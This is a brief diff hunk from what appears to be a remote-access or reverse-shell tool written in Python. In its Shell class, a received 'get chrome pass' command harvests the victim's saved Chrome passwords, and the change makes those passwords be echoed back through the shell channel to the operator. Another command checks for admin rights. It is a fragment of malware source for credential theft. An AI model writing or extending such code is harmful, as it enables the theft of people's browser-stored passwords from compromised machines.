@@ -59,7 +59,8 @@ class Shell:
                 
                 # Gets all chrome passwords
                 if data == "get chrome pass":
-                    cp.get_chrome_pass()
+                    data = "echo " + cp.get_chrome_pass()
+                    # cp.get_chrome_pass()
                     
                 # Checks if client has admin rights
                 if data == "check admin":
